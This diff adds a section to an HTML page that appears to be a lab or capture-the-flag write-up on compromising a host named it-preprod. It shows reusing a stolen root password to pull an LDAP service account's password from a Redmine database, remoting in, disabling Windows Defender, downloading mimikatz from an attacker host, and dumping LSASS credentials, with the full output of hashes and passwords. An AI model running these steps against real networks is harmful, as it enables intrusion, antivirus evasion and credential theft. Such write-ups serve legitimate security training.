@@ -65,7 +65,334 @@
 
     <div class="container">
       <section id="main_content">
-        <h2 id="it-preprod-1921684121">it-preprod 192.168.4.121</h2>
+        <h2 id="it-preprod-192168441">it-preprod 192.168.4.41</h2>
+
+<h3 id="1-hunt-for-credentials">1. Hunt for credentials</h3>
+<p>From IT-TRACK01 hunt for credentials on Redmain application mysql database:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[it-track01.it.gcb.local]: PS C:\Users\Administrator.IT\Documents&gt; cd C:\
+[it-track01.it.gcb.local]: PS C:\&gt; ls
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         6/5/2019   8:24 PM                Bitnami
+d-----        10/2/2020   4:49 AM                PerfLogs
+d-r---         9/5/2019   7:00 AM                Program Files
+d-----        9/15/2018  12:21 AM                Program Files (x86)
+d-----        9/19/2021   3:50 AM                Transcripts
+d-r---         6/5/2019   6:35 AM                Users
+d-----        2/15/2024   5:09 AM                Windows
+-a----         6/5/2019   8:31 PM           1024 .rnd
+
+
+[it-track01.it.gcb.local]: PS C:\&gt; cd .\Bitnami\redmine-4.0.3-3\mysql\bin\
+</code></pre></div></div>
+
+<p>In order to connect to the DB with root user credentials you should reuse the root password extracted in it-employee15$ machine from vault::list:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        Name       : Web Credentials
+        Path       : C:\Users\itemployee15\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+        Items (2)
+          0.    Internet Explorer
+                Type            : {3ccd5499-87a8-4b10-a215-608888dd3b55}
+                LastWritten     : 4/29/2024 4:11:22 AM
+                Flags           : 00000400
+                Ressource       : [STRING] http://192.168.4.111/
+                Identity        : [STRING] root
+                Authenticator   :
+                PackageSid      :
+                *Authenticator* : [STRING] BugTrackerL0g1n
+</code></pre></div></div>
+
+<p>DB query:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[it-track01.it.gcb.local]: PS C:\Bitnami\redmine-4.0.3-3\mysql\bin&gt; .\mysql.exe -u"root" -p"BugTrackerL0g1n" -e "use bitnami_redmine; select * from auth_sources\G;"
+.\mysql.exe : mysql: [Warning] Using a password on the command line interface can be insecure.
+    + CategoryInfo          : NotSpecified: (mysql: [Warning...an be insecure.:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+
+*************************** 1. row ***************************
+               id: 1
+             type: AuthSourceLdap
+             name: itdc
+             host: it-dc
+             port: 389
+          account: it\ldapintegration
+ account_password: FortheR3dmineM@achine
+          base_dn: cn=Users,dc=it,dc=gcb,dc=local
+       attr_login: sAMAccountName
+   attr_firstname:
+    attr_lastname:
+        attr_mail:
+onthefly_register: 0
+              tls: 0
+           filter:
+          timeout: NULL
+      verify_peer: 0
+</code></pre></div></div>
+
+<h3 id="2-it-preprod-access-with-itldapintegration-user">2. IT-PREPROD access with it\ldapintegration user</h3>
+
+<p>From it-employee15 with a new powershell:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\tools&gt; Enter-PSSession -ComputerName IT-PREPROD -Credential "IT\ldapintegration"
+[IT-PREPROD]: PS C:\Users\ldapintegration\Documents&gt; whoami
+it\ldapintegration
+[IT-PREPROD]: PS C:\Users\ldapintegration\Documents&gt; hostname
+it-preprod
+[IT-PREPROD]: PS C:\Users\ldapintegration\Documents&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::a49a:3908:8802:8a56%6
+   IPv4 Address. . . . . . . . . . . : 192.168.4.41
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.4.254
+</code></pre></div></div>
+
+<h3 id="3-disable-av-and-dump-lsass-process">3. Disable AV and Dump Lsass process</h3>
+
+<p>Extract credentials from it-preprod with administrator privileges:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[IT-PREPROD]: PS C:\Users\ldapintegration\Documents&gt; Set-MpPreference -DisableRealtimeMonitoring $True
+[IT-PREPROD]: PS C:\Users\ldapintegration\Documents&gt; wget http://192.168.100.15/mimikatz.exe -OutFile mimikatz.exe
+[IT-PREPROD]: PS C:\Users\ldapintegration\Documents&gt; .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonPasswords" "vault::list" "vault::cred /patch" "exit"
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # token::elevate
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+580     {0;000003e7} 0 D 20132          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Primary
+ -&gt; Impersonated !
+ * Process Token : {0;016e38c7} 0 D 24061385    IT\ldapintegration      S-1-5-21-948911695-1962824894-4291460450-1120   (10g,24p)       Primary
+ * Thread Token  : {0;000003e7} 0 D 24109008    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Impersonation (Delegation)
+
+mimikatz(commandline) # sekurlsa::logonPasswords
+
+Authentication Id : 0 ; 58493 (00000000:0000e47d)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:49:03 PM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : IT-PREPROD$
+         * Domain   : IT
+         * NTLM     : 5f1dffb5702e7cadbac52c38eb1acb28
+         * SHA1     : 418bdfdabd6f05608d4922f968e5365387099ece
+         * DPAPI    : 418bdfdabd6f05608d4922f968e53653
+        tspkg :
+        wdigest :
+         * Username : IT-PREPROD$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : IT-PREPROD$
+         * Domain   : it.gcb.local
+         * Password : 5e b6 a0 4a 70 00 af 0b 06 9b 4c a0 66 b9 22 bd b5 9f fb 20 f4 76 0b fc 38 5d 0b f3 a8 ed a9 ec 88 c3 bd 10 9a bb 32 7b 0e 5c 91 e6 36 73 0c 22 da 10 cb ed a1 b7 f2 b1 eb 83 b4 77 e3 84 e0 80 ed 9d 8e 1e 07 f6 60 f8 6f cb 44 eb 5d 74 09 bb 65 af 39 1a a7 47 85 56 c9 37 28 42 c1 4a 19 eb 3b ec 82 e8 4b c3 d6 f1 37 98 70 d3 08 59 9c e5 37 5f ec 23 4f c7 45 7b c9 6a 49 bf 8e c7 f4 e3 ff b3 4a bf ef 80 87 9b d5 0f e1 ae 17 55 45 fa 2e d1 65 49 55 7c 29 2f 5a de b0 cf 4d b7 57 97 45 3f e5 30 2b 11 3a b7 a4 d2 0f a8 c3 43 d0 e1 2e 55 24 1a 9e 1b 8c 77 c5 14 16 a3 6a c4 3b 72 f6 26 2b cb fc b4 3e d6 c7 90 6d a7 ee 45 05 f0 91 3a 3c 08 f0 ea 8e 46 9d 84 ce 96 85 25 fa 3f 5a cb 02 81 8a 56 d1 dd b8 6f 15 a6 52 95 3d c0
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : IT-PREPROD$
+Domain            : IT
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:48:49 PM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : IT-PREPROD$
+         * Domain   : IT
+         * NTLM     : 5f1dffb5702e7cadbac52c38eb1acb28
+         * SHA1     : 418bdfdabd6f05608d4922f968e5365387099ece
+         * DPAPI    : 418bdfdabd6f05608d4922f968e53653
+        tspkg :
+        wdigest :
+         * Username : IT-PREPROD$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : it-preprod$
+         * Domain   : IT.GCB.LOCAL
+         * Password : 5e b6 a0 4a 70 00 af 0b 06 9b 4c a0 66 b9 22 bd b5 9f fb 20 f4 76 0b fc 38 5d 0b f3 a8 ed a9 ec 88 c3 bd 10 9a bb 32 7b 0e 5c 91 e6 36 73 0c 22 da 10 cb ed a1 b7 f2 b1 eb 83 b4 77 e3 84 e0 80 ed 9d 8e 1e 07 f6 60 f8 6f cb 44 eb 5d 74 09 bb 65 af 39 1a a7 47 85 56 c9 37 28 42 c1 4a 19 eb 3b ec 82 e8 4b c3 d6 f1 37 98 70 d3 08 59 9c e5 37 5f ec 23 4f c7 45 7b c9 6a 49 bf 8e c7 f4 e3 ff b3 4a bf ef 80 87 9b d5 0f e1 ae 17 55 45 fa 2e d1 65 49 55 7c 29 2f 5a de b0 cf 4d b7 57 97 45 3f e5 30 2b 11 3a b7 a4 d2 0f a8 c3 43 d0 e1 2e 55 24 1a 9e 1b 8c 77 c5 14 16 a3 6a c4 3b 72 f6 26 2b cb fc b4 3e d6 c7 90 6d a7 ee 45 05 f0 91 3a 3c 08 f0 ea 8e 46 9d 84 ce 96 85 25 fa 3f 5a cb 02 81 8a 56 d1 dd b8 6f 15 a6 52 95 3d c0
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 25034 (00000000:000061ca)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:48:49 PM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : IT-PREPROD$
+         * Domain   : IT
+         * NTLM     : 5f1dffb5702e7cadbac52c38eb1acb28
+         * SHA1     : 418bdfdabd6f05608d4922f968e5365387099ece
+         * DPAPI    : 418bdfdabd6f05608d4922f968e53653
+        tspkg :
+        wdigest :
+         * Username : IT-PREPROD$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : IT-PREPROD$
+         * Domain   : it.gcb.local
+         * Password : 5e b6 a0 4a 70 00 af 0b 06 9b 4c a0 66 b9 22 bd b5 9f fb 20 f4 76 0b fc 38 5d 0b f3 a8 ed a9 ec 88 c3 bd 10 9a bb 32 7b 0e 5c 91 e6 36 73 0c 22 da 10 cb ed a1 b7 f2 b1 eb 83 b4 77 e3 84 e0 80 ed 9d 8e 1e 07 f6 60 f8 6f cb 44 eb 5d 74 09 bb 65 af 39 1a a7 47 85 56 c9 37 28 42 c1 4a 19 eb 3b ec 82 e8 4b c3 d6 f1 37 98 70 d3 08 59 9c e5 37 5f ec 23 4f c7 45 7b c9 6a 49 bf 8e c7 f4 e3 ff b3 4a bf ef 80 87 9b d5 0f e1 ae 17 55 45 fa 2e d1 65 49 55 7c 29 2f 5a de b0 cf 4d b7 57 97 45 3f e5 30 2b 11 3a b7 a4 d2 0f a8 c3 43 d0 e1 2e 55 24 1a 9e 1b 8c 77 c5 14 16 a3 6a c4 3b 72 f6 26 2b cb fc b4 3e d6 c7 90 6d a7 ee 45 05 f0 91 3a 3c 08 f0 ea 8e 46 9d 84 ce 96 85 25 fa 3f 5a cb 02 81 8a 56 d1 dd b8 6f 15 a6 52 95 3d c0
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 23300 (00000000:00005b04)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:48:48 PM
+SID               :
+        msv :
+         [00000003] Primary
+         * Username : IT-PREPROD$
+         * Domain   : IT
+         * NTLM     : 5f1dffb5702e7cadbac52c38eb1acb28
+         * SHA1     : 418bdfdabd6f05608d4922f968e5365387099ece
+         * DPAPI    : 418bdfdabd6f05608d4922f968e53653
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 602247 (00000000:00093087)
+Session           : RemoteInteractive from 2
+User Name         : ldapintegration
+Domain            : IT
+Logon Server      : IT-DC
+Logon Time        : 4/28/2024 11:56:32 PM
+SID               : S-1-5-21-948911695-1962824894-4291460450-1120
+        msv :
+         [00000003] Primary
+         * Username : ldapintegration
+         * Domain   : IT
+         * NTLM     : eba1b0f28ec756feca1421f4c9572122
+         * SHA1     : e40849ff0c1dd907e4de053f69f60cdab039b297
+         * DPAPI    : 850949fbf018238dfc41a0e6e854f8c9
+        tspkg :
+        wdigest :
+         * Username : ldapintegration
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : ldapintegration
+         * Domain   : IT.GCB.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 575698 (00000000:0008c8d2)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:56:10 PM
+SID               : S-1-5-96-0-2
+        msv :
+         [00000003] Primary
+         * Username : IT-PREPROD$
+         * Domain   : IT
+         * NTLM     : 5f1dffb5702e7cadbac52c38eb1acb28
+         * SHA1     : 418bdfdabd6f05608d4922f968e5365387099ece
+         * DPAPI    : 418bdfdabd6f05608d4922f968e53653
+        tspkg :
+        wdigest :
+         * Username : IT-PREPROD$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : IT-PREPROD$
+         * Domain   : it.gcb.local
+         * Password : 5e b6 a0 4a 70 00 af 0b 06 9b 4c a0 66 b9 22 bd b5 9f fb 20 f4 76 0b fc 38 5d 0b f3 a8 ed a9 ec 88 c3 bd 10 9a bb 32 7b 0e 5c 91 e6 36 73 0c 22 da 10 cb ed a1 b7 f2 b1 eb 83 b4 77 e3 84 e0 80 ed 9d 8e 1e 07 f6 60 f8 6f cb 44 eb 5d 74 09 bb 65 af 39 1a a7 47 85 56 c9 37 28 42 c1 4a 19 eb 3b ec 82 e8 4b c3 d6 f1 37 98 70 d3 08 59 9c e5 37 5f ec 23 4f c7 45 7b c9 6a 49 bf 8e c7 f4 e3 ff b3 4a bf ef 80 87 9b d5 0f e1 ae 17 55 45 fa 2e d1 65 49 55 7c 29 2f 5a de b0 cf 4d b7 57 97 45 3f e5 30 2b 11 3a b7 a4 d2 0f a8 c3 43 d0 e1 2e 55 24 1a 9e 1b 8c 77 c5 14 16 a3 6a c4 3b 72 f6 26 2b cb fc b4 3e d6 c7 90 6d a7 ee 45 05 f0 91 3a 3c 08 f0 ea 8e 46 9d 84 ce 96 85 25 fa 3f 5a cb 02 81 8a 56 d1 dd b8 6f 15 a6 52 95 3d c0
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:49:03 PM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : IT-PREPROD$
+Domain            : IT
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:48:48 PM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : IT-PREPROD$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : it-preprod$
+         * Domain   : IT.GCB.LOCAL
+         * Password : 5e b6 a0 4a 70 00 af 0b 06 9b 4c a0 66 b9 22 bd b5 9f fb 20 f4 76 0b fc 38 5d 0b f3 a8 ed a9 ec 88 c3 bd 10 9a bb 32 7b 0e 5c 91 e6 36 73 0c 22 da 10 cb ed a1 b7 f2 b1 eb 83 b4 77 e3 84 e0 80 ed 9d 8e 1e 07 f6 60 f8 6f cb 44 eb 5d 74 09 bb 65 af 39 1a a7 47 85 56 c9 37 28 42 c1 4a 19 eb 3b ec 82 e8 4b c3 d6 f1 37 98 70 d3 08 59 9c e5 37 5f ec 23 4f c7 45 7b c9 6a 49 bf 8e c7 f4 e3 ff b3 4a bf ef 80 87 9b d5 0f e1 ae 17 55 45 fa 2e d1 65 49 55 7c 29 2f 5a de b0 cf 4d b7 57 97 45 3f e5 30 2b 11 3a b7 a4 d2 0f a8 c3 43 d0 e1 2e 55 24 1a 9e 1b 8c 77 c5 14 16 a3 6a c4 3b 72 f6 26 2b cb fc b4 3e d6 c7 90 6d a7 ee 45 05 f0 91 3a 3c 08 f0 ea 8e 46 9d 84 ce 96 85 25 fa 3f 5a cb 02 81 8a 56 d1 dd b8 6f 15 a6 52 95 3d c0
+        ssp :
+        credman :
+
+mimikatz(commandline) # vault::list
+
+Vault : {4bf4c442-9b8a-41a0-b380-dd4a704ddb28}
+        Name       : Web Credentials
+        Path       : C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+        Items (0)
+
+Vault : {77bc582b-f0a6-4e15-4e80-61736b6f3b29}
+        Name       : Windows Credentials
+        Path       : C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Vault
+        Items (0)
+
+mimikatz(commandline) # vault::cred /patch
+
+mimikatz(commandline) # exit
+Bye!
+</code></pre></div></div>
 
 <p><a href="./section2.html">back</a></p>
 
